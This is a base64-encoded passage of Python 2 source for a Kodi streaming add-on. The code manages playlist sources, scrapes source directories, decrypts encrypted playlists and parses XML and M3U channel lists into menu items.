Agc291cmNlcy5hcHBlbmQoc291cmNlX21lZGlhKQ0KICAgICAgICAgICAgYiA9IG9wZW4oc291cmNlX2ZpbGUsInciKQ0KICAgICAgICAgICAgYi53cml0ZShqc29uLmR1bXBzKHNvdXJjZXMpKQ0KICAgICAgICAgICAgYi5jbG9zZSgpDQogICAgICAgIGFkZG9uLnNldFNldHRpbmcoJ25ld191cmxfc291cmNlJywgIiIpDQogICAgICAgIGFkZG9uLnNldFNldHRpbmcoJ25ld19maWxlX3NvdXJjZScsICIiKQ0KICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLk5vdGlmaWNhdGlvbih0ZWFtLm1pbGhhbm9zLE5ldyBzb3VyY2UgYWRkZWQuLDUwMDAsIitpY29uKyIpIikNCiAgICAgICAgaWYgbm90IHVybCBpcyBOb25lOg0KICAgICAgICAgICAgaWYgJ3hibWNwbHVzLnhiLmZ1bnBpYy5kZScgaW4gdXJsOg0KICAgICAgICAgICAgICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oIlhCTUMuQ29udGFpbmVyLlVwZGF0ZSglcz9tb2RlPTE0LHJlcGxhY2UpIiAlc3lzLmFyZ3ZbMF0pDQogICAgICAgICAgICBlbGlmICdjb21tdW5pdHktbGlua3MnIGluIHVybDoNCiAgICAgICAgICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLkNvbnRhaW5lci5VcGRhdGUoJXM/bW9kZT0xMCxyZXBsYWNlKSIgJXN5cy5hcmd2WzBdKQ0KICAgICAgICBlbHNlOiBhZGRvbi5vcGVuU2V0dGluZ3MoKQ0KDQoNCmRlZiBybVNvdXJjZShuYW1lKToNCiAgICAgICAgc291cmNlcyA9IGpzb24ubG9hZHMob3Blbihzb3VyY2VfZmlsZSwiciIpLnJlYWQoKSkNCiAgICAgICAgZm9yIGluZGV4IGluIHJhbmdlKGxlbihzb3VyY2VzKSk6DQogICAgICAgICAgICBpZiBpc2luc3RhbmNlKHNvdXJjZXNbaW5kZXhdLCBsaXN0KToNCiAgICAgICAgICAgICAgICBpZiBzb3VyY2VzW2luZGV4XVswXSA9PSBuYW1lOg0KICAgICAgICAgICAgICAgICAgICBkZWwgc291cmNlc1tpbmRleF0NCiAgICAgICAgICAgICAgICAgICAgYiA9IG9wZW4oc291cmNlX2ZpbGUsInciKQ0KICAgICAgICAgICAgICAgICAgICBiLndyaXRlKGpzb24uZHVtcHMoc291cmNlcykpDQogICAgICAgICAgICAgICAgICAgIGIuY2xvc2UoKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBpZiBzb3VyY2VzW2luZGV4XVsndGl0bGUnXSA9PSBuYW1lOg0KICAgICAgICAgICAgICAgICAgICBkZWwgc291cmNlc1tpbmRleF0NCiAgICAgICAgICAgICAgICAgICAgYiA9IG9wZW4oc291cmNlX2ZpbGUsInciKQ0KICAgICAgICAgICAgICAgICAgICBiLndyaXRlKGpzb24uZHVtcHMoc291cmNlcykpDQogICAgICAgICAgICAgICAgICAgIGIuY2xvc2UoKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLkNvbnRhaW5lci5SZWZyZXNoIikNCg0KDQpkZWYgZ2V0X3htbF9kYXRhYmFzZSh1cmwsIGJyb3dzZT1GYWxzZSk6DQogICAgICAgIGlmIHVybCBpcyBOb25lOg0KICAgICAgICAgICAgdXJsID0gJ2h0dHA6Ly94Ym1jcGx1cy54Yi5mdW5waWMuZGUvd3d3LWRhdGEvZmlsZXN5c3RlbS8nDQogICAgICAgIHNvdXAgPSBCZWF1dGlmdWxTb3VwKG1ha2VSZXF1ZXN0KHVybCksIGNvbnZlcnRFbnRpdGllcz1CZWF1dGlmdWxTb3VwLkhUTUxfRU5USVRJRVMpDQogICAgICAgIGZvciBpIGluIHNvdXAoJ2EnKToNCiAgICAgICAgICAgIGhyZWYgPSBpWydocmVmJ10NCiAgICAgICAgICAgIGlmIG5vdCBocmVmLnN0YXJ0c3dpdGgoJz8nKToNCiAgICAgICAgICAgICAgICBuYW1lID0gaS5zdHJpbmcNCiAgICAgICAgICAgICAgICBpZiBuYW1lIG5vdCBpbiBbJ1BhcmVudCBEaXJlY3RvcnknLCAncmVjeWNsZV9iaW4vJ106DQogICAgICAgICAgICAgICAgICAgIGlmIGhyZWYuZW5kc3dpdGgoJy8nKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJyb3dzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGREaXIobmFtZSx1cmwraHJlZiwxNSxpY29uLGZhbmFydCwnJywnJywnJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkRGlyKG5hbWUsdXJsK2hyZWYsMTQsaWNvbixmYW5hcnQsJycsJycsJycpDQogICAgICAgICAgICAgICAgICAgIGVsaWYgaHJlZi5lbmRzd2l0aCgnLnhtbCcpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgYnJvd3NlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFkZERpcihuYW1lLHVybCtocmVmLDEsaWNvbixmYW5hcnQsJycsJycsJycsJycsJ2Rvd25sb2FkJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc291cmNlX2ZpbGUpPT1UcnVlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBuYW1lIGluIFNPVVJDRVM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGREaXIobmFtZSsnIChpbiB1c2UpJyx1cmwraHJlZiwxMSxpY29uLGZhbmFydCwnJywnJywnJywnJywnZG93bmxvYWQnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkRGlyKG5hbWUsdXJsK2hyZWYsMTEsaWNvbixmYW5hcnQsJycsJycsJycsJycsJ2Rvd25sb2FkJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGREaXIobmFtZSx1cmwraHJlZiwxMSxpY29uLGZhbmFydCwnJywnJywnJywnJywnZG93bmxvYWQnKQ0KDQoNCmRlZiBnZXRDb21tdW5pdHlTb3VyY2VzKGJyb3dzZT1GYWxzZSk6DQogICAgICAgIHVybCA9ICdodHRwOi8vY29tbXVuaXR5LWxpbmtzLmdvb2dsZWNvZGUuY29tL3N2bi90cnVuay8nDQogICAgICAgIHNvdXAgPSBCZWF1dGlmdWxTb3VwKG1ha2VSZXF1ZXN0KHVybCksIGNvbnZlcnRFbnRpdGllcz1CZWF1dGlmdWxTb3VwLkhUTUxfRU5USVRJRVMpDQogICAgICAgIGZpbGVzID0gc291cCgndWwnKVswXSgnbGknKVsxOl0NCiAgICAgICAgZm9yIGkgaW4gZmlsZXM6DQogICAgICAgICAgICBuYW1lID0gaSgnYScpWzBdWydocmVmJ10NCiAgICAgICAgICAgIGlmIGJyb3dzZToNCiAgICAgICAgICAgICAgICBhZGREaXIobmFtZSx1cmwrbmFtZSwxLGljb24sZmFuYXJ0LCcnLCcnLCcnLCcnLCdkb3dubG9hZCcpDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGFkZERpcihuYW1lLHVybCtuYW1lLDExLGljb24sZmFuYXJ0LCcnLCcnLCcnLCcnLCdkb3dubG9hZCcpDQoNCg0KZGVmIGdldFNvdXAodXJsLGRhdGE9Tm9uZSk6DQogICAgICAgIGdsb2JhbCB2aWV3bW9kZSx0c2Rvd25sb2FkZXINCiAgICAgICAgdHNkb3dubG9hZGVyPUZhbHNlDQogICAgICAgIGlmIHVybC5zdGFydHN3aXRoKCdodHRwOi8vJykgb3IgdXJsLnN0YXJ0c3dpdGgoJ2h0dHBzOi8vJyk6DQogICAgICAgICAgICBlbmNrZXk9RmFsc2UNCiAgICAgICAgICAgIGlmICckJFRTRE9XTkxPQURFUiQkJyBpbiB1cmw6DQogICAgICAgICAgICAgICAgdHNkb3dubG9hZGVyPVRydWUNCiAgICAgICAgICAgICAgICB1cmw9dXJsLnJlcGxhY2UoIiQkVFNET1dOTE9BREVSJCQiLCIiKQ0KICAgICAgICAgICAgaWYgJyQkTFNQcm9FbmNLZXk9JyBpbiB1cmw6DQogICAgICAgICAgICAgICAgZW5ja2V5PXVybC5zcGxpdCgnJCRMU1Byb0VuY0tleT0nKVsxXS5zcGxpdCgnJCQnKVswXQ0KICAgICAgICAgICAgICAgIHJwPSckJExTUHJvRW5jS2V5PSVzJCQnJWVuY2tleQ0KICAgICAgICAgICAgICAgIHVybD11cmwucmVwbGFjZShycCwiIikNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGRhdGEgPW1ha2VSZXF1ZXN0KHVybCkNCiAgICAgICAgICAgIGlmIGVuY2tleToNCiAgICAgICAgICAgICAgICAgICAgaW1wb3J0IHB5YWVzDQogICAgICAgICAgICAgICAgICAgIGVuY2tleT1lbmNrZXkuZW5jb2RlKCJhc2NpaSIpDQogICAgICAgICAgICAgICAgICAgIHByaW50IGVuY2tleQ0KICAgICAgICAgICAgICAgICAgICBtaXNzaW5nYnl0ZXM9MTYtbGVuKGVuY2tleSkNCiAgICAgICAgICAgICAgICAgICAgZW5ja2V5PWVuY2tleSsoY2hyKDApKihtaXNzaW5nYnl0ZXMpKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCByZXByKGVuY2tleSkNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1iYXNlNjQuYjY0ZGVjb2RlKGRhdGEpDQogICAgICAgICAgICAgICAgICAgIGRlY3J5cHRvciA9IHB5YWVzLm5ldyhlbmNrZXkgLCBweWFlcy5NT0RFX0VDQiwgSVY9Tm9uZSkNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1kZWNyeXB0b3IuZGVjcnlwdChkYXRhKS5zcGxpdCgnXDAnKVswXQ0KICAgICAgICAgICAgICAgICAgICAjcHJpbnQgcmVwcihkYXRhKQ0KICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCIjRVhUTTNVIixkYXRhKSBvciAnbTN1JyBpbiB1cmw6DQojICAgICAgICAgICAgICAgIHByaW50ICdmb3VuZCBtM3UgZGF0YScNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICBlbGlmIGRhdGEgPT0gTm9uZToNCiAgICAgICAgICAgIGlmIG5vdCAnLycgIGluIHVybCBvciBub3QgJ1xcJyBpbiB1cmw6DQojICAgICAgICAgICAgICAgIHByaW50ICdObyBkaXJlY3RvcnkgZm91bmQuIExldHMgbWFrZSB0aGUgdXJsIHRvIGNhY2hlIGRpcicNCiAgICAgICAgICAgICAgICB1cmwgPSBvcy5wYXRoLmpvaW4oY29tbXVuaXR5ZmlsZXMsdXJsKQ0KICAgICAgICAgICAgaWYgeGJtY3Zmcy5leGlzdHModXJsKToNCiAgICAgICAgICAgICAgICBpZiB1cmwuc3RhcnRzd2l0aCgic21iOi8vIikgb3IgdXJsLnN0YXJ0c3dpdGgoIm5mczovLyIpOg0KICAgICAgICAgICAgICAgICAgICBjb3B5ID0geGJtY3Zmcy5jb3B5KHVybCwgb3MucGF0aC5qb2luKHByb2ZpbGUsICd0ZW1wJywgJ3NvcmNlX3RlbXAudHh0JykpDQogICAgICAgICAgICAgICAgICAgIGlmIGNvcHk6DQogICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gb3Blbihvcy5wYXRoLmpvaW4ocHJvZmlsZSwgJ3RlbXAnLCAnc29yY2VfdGVtcC50eHQnKSwgInIiKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHhibWN2ZnMuZGVsZXRlKG9zLnBhdGguam9pbihwcm9maWxlLCAndGVtcCcsICdzb3JjZV90ZW1wLnR4dCcpKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgYWRkb25fbG9nKCJmYWlsZWQgdG8gY29weSBmcm9tIHNtYjoiKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBvcGVuKHVybCwgJ3InKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgaWYgcmUubWF0Y2goIiNFWFRNM1UiLGRhdGEpb3IgJ20zdScgaW4gdXJsOg0KIyAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdmb3VuZCBtM3UgZGF0YScNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGFkZG9uX2xvZygiU291cCBEYXRhIG5vdCBmb3VuZCEiKQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICBpZiAnPFNldFZpZXdNb2RlPicgaW4gZGF0YToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICB2aWV3bW9kZT1yZS5maW5kYWxsKCc8U2V0Vmlld01vZGU+KC4qPyk8JyxkYXRhKVswXQ0KICAgICAgICAgICAgICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oIkNvbnRhaW5lci5TZXRWaWV3TW9kZSglcykiJXZpZXdtb2RlKQ0KICAgICAgICAgICAgICAgIHByaW50ICdkb25lIHNldHZpZXcnLHZpZXdtb2RlDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgcmV0dXJuIEJlYXV0aWZ1bFNPQVAoZGF0YSwgY29udmVydEVudGl0aWVzPUJlYXV0aWZ1bFN0b25lU291cC5YTUxfRU5USVRJRVMpDQoNCg0KZGVmIGdldERhdGEodXJsLGZhbmFydCwgZGF0YT1Ob25lKToNCiAgICBzb3VwID0gZ2V0U291cCh1cmwsZGF0YSkNCiAgICAjcHJpbnQgdHlwZShzb3VwKQ0KICAgIGlmIGlzaW5zdGFuY2Uoc291cCxCZWF1dGlmdWxTT0FQKToNCiAgICAjcHJpbnQgJ3h4eHh4eHh4eHhzb3VwJyxzb3VwDQogICAgICAgIGlmIGxlbihzb3VwKCdjaGFubmVscycpKSA+IDAgYW5kIGFkZG9uLmdldFNldHRpbmcoJ2Rvbm90c2hvd2J5Y2hhbm5lbHMnKSA9PSAnZmFsc2UnOg0KICAgICAgICAgICAgY2hhbm5lbHMgPSBzb3VwKCdjaGFubmVsJykNCiAgICAgICAgICAgIGZvciBjaGFubmVsIGluIGNoYW5uZWxzOg0KIyAgICAgICAgICAgICAgICBwcmludCBjaGFubmVsDQoNCiAgICAgICAgICAgICAgICBsaW5rZWRVcmw9JycNCiAgICAgICAgICAgICAgICBsY291bnQ9MA0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgbGlua2VkVXJsID0gIGNoYW5uZWwoJ2V4dGVybmFsbGluaycpWzBdLnN0cmluZw0KICAgICAgICAgICAgICAgICAgICBsY291bnQ9bGVuKGNoYW5uZWwoJ2V4dGVybmFsbGluaycpKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgICNwcmludCAnbGlua2VkVXJsJyxsaW5rZWRVcmwsbGNvdW50DQogICAgICAgICAgICAgICAgaWYgbGNvdW50PjE6IGxpbmtlZFVybD0nJw0KDQogICAgICAgICAgICAgICAgbmFtZSA9IGNoYW5uZWwoJ25hbWUnKVswXS5zdHJpbmcNCiAgICAgICAgICAgICAgICB0aHVtYm5haWwgPSBjaGFubmVsKCd0aHVtYm5haWwnKVswXS5zdHJpbmcNCiAgICAgICAgICAgICAgICBpZiB0aHVtYm5haWwgPT0gTm9uZToNCiAgICAgICAgICAgICAgICAgICAgdGh1bWJuYWlsID0gJycNCg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGNoYW5uZWwoJ2ZhbmFydCcpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWRkb24uZ2V0U2V0dGluZygndXNlX3RodW1iJykgPT0gInRydWUiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZhbkFydCA9IHRodW1ibmFpbA0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmYW5BcnQgPSBmYW5hcnQNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZhbkFydCA9IGNoYW5uZWwoJ2ZhbmFydCcpWzBdLnN0cmluZw0KICAgICAgICAgICAgICAgICAgICBpZiBmYW5BcnQgPT0gTm9uZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICBmYW5BcnQgPSBmYW5hcnQNCg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgZGVzYyA9IGNoYW5uZWwoJ2luZm8nKVswXS5zdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgaWYgZGVzYyA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UNCiAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgIGRlc2MgPSAnJw0KDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBnZW5yZSA9IGNoYW5uZWwoJ2dlbnJlJylbMF0uc3RyaW5nDQogICAgICAgICAgICAgICAgICAgIGlmIGdlbnJlID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgICAgICByYWlzZQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgZ2VucmUgPSAnJw0KDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBkYXRlID0gY2hhbm5lbCgnZGF0ZScpWzBdLnN0cmluZw0KICAgICAgICAgICAgICAgICAgICBpZiBkYXRlID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgICAgICByYWlzZQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgZGF0ZSA9ICcnDQoNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGNyZWRpdHMgPSBjaGFubmVsKCdjcmVkaXRzJylbMF0uc3RyaW5nDQogICAgICAgICAgICAgICAgICAgIGlmIGNyZWRpdHMgPT0gTm9uZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICBjcmVkaXRzID0gJycNCg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgaWYgbGlua2VkVXJsPT0nJzoNCiAgICAgICAgICAgICAgICAgICAgICAgIGFkZERpcihuYW1lLmVuY29kZSgndXRmLTgnLCAnaWdub3JlJyksdXJsLmVuY29kZSgndXRmLTgnKSwyLHRodW1ibmFpbCxmYW5BcnQsZGVzYyxnZW5yZSxkYXRlLGNyZWRpdHMsVHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICNwcmludCBsaW5rZWRVcmwNCiAgICAgICAgICAgICAgICAgICAgICAgIGFkZERpcihuYW1lLmVuY29kZSgndXRmLTgnKSxsaW5rZWRVcmwuZW5jb2RlKCd1dGYtOCcpLDEsdGh1bWJuYWlsLGZhbkFydCxkZXNjLGdlbnJlLGRhdGUsTm9uZSwnc291cmNlJykNCiAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgIGFkZG9uX2xvZygnVGhlcmUgd2FzIGEgcHJvYmxlbSBhZGRpbmcgZGlyZWN0b3J5IGZyb20gZ2V0RGF0YSgpOiAnK25hbWUuZW5jb2RlKCd1dGYtOCcsICdpZ25vcmUnKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGFkZG9uX2xvZygnTm8gQ2hhbm5lbHM6IGdldEl0ZW1zJykNCiAgICAgICAgICAgIGdldEl0ZW1zKHNvdXAoJ2l0ZW0nKSxmYW5hcnQpDQogICAgZWxzZToNCiAgICAgICAgcGFyc2VfbTN1KHNvdXApDQoNCg0KZGVmIHBhcnNlX20zdShkYXRhKToNCiAgICBjb250ZW50ID0gZGF0YS5yc3RyaXAoKQ0KICAgIG1hdGNoID0gcmUuY29tcGlsZShyJyNFWFRJTkY6KC4rPyksKC4qPylbXG5ccl0rKFteXHJcbl0rKScpLmZpbmRhbGwoY29udGVudCkNCiAgICB0b3RhbCA9IGxlbihtYXRjaCkNCiAgICBwcmludCAndHNkb3dubG9hZGVyJyx0c2Rvd25sb2FkZXINCiMgICAgcHJpbnQgJ3RvdGFsIG0zdSBsaW5rcycsdG90YWwNCiAgICBmb3Igb3RoZXIsY2hhbm5lbF9uYW1lLHN0cmVhbV91cmwgaW4gbWF0Y2g6DQogICAgICAgIA0KICAgICAgICBpZiAndHZnLWxvZ28nIGluIG90aGVyOg0KICAgICAgICAgICAgdGh1bWJuYWlsID0gcmVfbWUob3RoZXIsJ3R2Zy1sb2dvPVtcJyJdKC4qPylbXCciXScpDQogICAgICAgICAgICBpZiB0aHVtYm5haWw6DQogICAgICAgICAgICAgICAgaWYgdGh1bWJuYWlsLnN0YXJ0c3dpdGgoJ2h0dHAnKToNCiAgICAgICAgICAgICAgICAgICAgdGh1bWJuYWlsID0gdGh1bWJuYWlsDQoNCiAgICAgICAgICAgICAgICBlbGlmIG5vdCBhZGRvbi5nZXRTZXR0aW5nKCdsb2dvLWZvbGRlclBhdGgnKSA9PSAiIjoNCiAgICAgICAgICAgICAgICAgICAgbG9nb191cmwgPSBhZGRvbi5nZXRTZXR0aW5nKCdsb2dvLWZvbGRlclBhdGgnKQ0KICAgICAgICAgICAgICAgICAgICB0aHVtYm5haWwgPSBsb2dvX3VybCArIHRodW1ibmFpbA0KDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgdGh1bWJuYWlsID0gdGh1bWJuYWlsDQogICAgICAgICAgICAjZWxzZToNCg0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgdGh1bWJuYWlsID0gJycNCiAgICAgICAgDQogICAgICAgIGlmICd0eXBlJyBpbiBvdGhlcjoNCiAgICAgICAgICAgIG1vZGVfdHlwZSA9IHJlX21lKG90aGVyLCd0eXBlPVtcJyJdKC4qPylbXCciXScpDQogICAgICAgICAgICBpZiBtb2RlX3R5cGUgPT0gJ3l0LWRsJzoNCiAgICAgICAgICAgICAgICBzdHJlYW1fdXJsID0gc3RyZWFtX3VybCArIiZtb2RlPTE4Ig0KICAgICAgICAgICAgZWxpZiBtb2RlX3R5cGUgPT0gJ3JlZ2V4JzoNCiAgICAgICAgICAgICAgICB1cmwgPSBzdHJlYW1fdXJsLnNwbGl0KCcmcmVnZXhzPScpDQogICAgICAgICAgICAgICAgI3ByaW50IHVybFswXSBnZXRTb3VwKHVybCxkYXRhPU5vbmUpDQogICAgICAgICAgICAgICAgcmVnZXhzID0gcGFyc2VfcmVnZXgoZ2V0U291cCgnJyxkYXRhPXVybFsxXSkpDQoNCiAgICAgICAgICAgICAgICBhZGRMaW5rKHVybFswXSwgY2hhbm5lbF9uYW1lLHRodW1ibmFpbCwnJywnJywnJywnJywnJyxOb25lLHJlZ2V4cyx0b3RhbCkNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgZWxpZiBtb2RlX3R5cGUgPT0gJ2Z0dic6DQogICAgICAgICAgICAgICAgc3RyZWFtX3VybCA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8uRi5ULlYvP25hbWU9Jyt1cmxsaWIucXVvdGUoY2hhbm5lbF9uYW1lKSArJyZ1cmw9JyArc3RyZWFtX3VybCArJyZtb2RlPTEyNSZjaF9mYW5hcnQ9bmEnDQogICAgICAgIGVsaWYgdHNkb3dubG9hZGVyIGFuZCAnLnRzJyBpbiBzdHJlYW1fdXJsOg0KICAgICAgICAgICAgc3RyZWFtX3VybCA9ICdwbHVnaW46Ly9wbHVnaW4udmlkZW8uZjRtVGVzdGVyLz91cmw9Jyt1cmxsaWIucXVvdGVfcGx1cyhzdHJlYW1fdXJsKSsnJmFtcDtzdHJlYW10eXBlPVRTRE9XTkxPQURFUiZuYW1lPScrdXJsbGliLnF1b3RlKGNoYW5uZWxfbmFtZSkNCiAgICAgICAgYWRkTGluayhzdHJlYW1fdXJsLCBjaGFubmVsX25hbWUsdGh1bWJuYWlsLCcnLCcnLCcnLCcnLCcnLE5vbmUsJycsdG90YWwpDQoNCg0KZGVmIGdldENoYW5uZWxJdGVtcyhuYW1lLHVybCxmYW5hcnQpOg0KICAgICAgICBzb3VwID0gZ2V0U291cCh1cmwpDQogICAgICAgIGNoYW5uZWxfbGlzdCA9IHNvdXAuZmluZCgnY2hhbm5lbCcsIGF0dHJzPXsnbmFtZScgOiBuYW1lLmRlY29kZSgndXRmLTgnKX0pDQogICAgICAgIGl0ZW1zID0gY2hhbm5lbF9saXN0KCdpdGVtJykNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZmFuQXJ0ID0gY2hhbm5lbF9saXN0KCdmYW5hcnQnKVswXS5zdHJpbmcNCiAgICAgICAgICAgIGlmIGZhbkFydCA9PSBOb25lOg0KICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIGZhbkFydCA9IGZhbmFydA0KICAgICAgICBmb3IgY2hhbm5lbCBpbiBjaGFubmVsX2xpc3QoJ3N1YmNoYW5uZWwnKToNCiAgICAgICAgICAgIG5hbWUgPSBjaGFubmVsKCduYW1lJylbMF0uc3RyaW5nDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdGh1bWJuYWlsID0gY2hhbm5lbCgndGh1bWJuYWlsJylbMF0uc3RyaW5nDQogICAgICAgICAgICAgICAgaWYgdGh1bWJuYWlsID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgdGh1bWJuYWlsID0gJycNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhbm5lbCgnZmFuYXJ0Jyk6DQogICAgICAgICAgICAgICAgICAgIGlmIGFkZG9uLmdldFNldHRpbmcoJ3VzZV90aHVtYicpID09ICJ0cnVlIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGZhbkFydCA9IHRodW1ibmFpbA0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGZhbkFydCA9IGNoYW5uZWwoJ2ZhbmFydCcpWzBdLnN0cmluZw0KICAgICAgICAgICAgICAgIGlmIGZhbkFydCA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICByYWlzZQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBkZXNjID0gY2hhbm5lbCgnaW5mbycpWzBdLnN0cmluZw0KICAgICAgICAgICAgICAgIGlmIGRlc2MgPT0gTm9uZToNCiAgICAgICAgICAgICAgICAgICAgcmFpc2UNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBkZXNjID0gJycNCg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGdlbnJlID0gY2hhbm5lbCgnZ2VucmUnKVswXS5zdHJpbmcNCiAgICAgICAgICAgICAgICBpZiBnZW5yZSA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICByYWlzZQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGdlbnJlID0gJycNCg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGRhdGUgPSBjaGFubmVsKCdkYXRlJylbMF0uc3RyaW5nDQogICAgICAgICAgICAgICAgaWYgZGF0ZSA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICByYWlzZQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGRhdGUgPSAnJw0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgY3JlZGl0cyA9IGNoYW5uZWwoJ2NyZWRpdHMnKVswXS5zdHJpbmcNCiAgICAgICAgICAgICAgICBpZiBjcmVkaXRzID09IE5vbmU6DQogICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgY3JlZGl0cyA9ICcnDQoNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBhZGREaXIobmFtZS5lbmNvZGUoJ3V0Zi04JywgJ2lnbm9yZScpLHVybC5lbmNvZGUoJ3V0Zi04JyksMyx0aHVtYm5haWwsZmFuQXJ0LGRlc2MsZ2VucmUsY3JlZGl0cyxkYXRlKQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGFkZG9uX2xvZygnVGhlcmUgd2FzIGEgcHJvYmxlbSBhZGRpbmcgZGlyZWN0b3J5IC0gJytuYW1lLmVuY29kZSgndXRmLTgnLCAnaWdub3JlJykpDQogICAgICAgIGdldEl0ZW1zKGl0ZW1zLGZhbkFy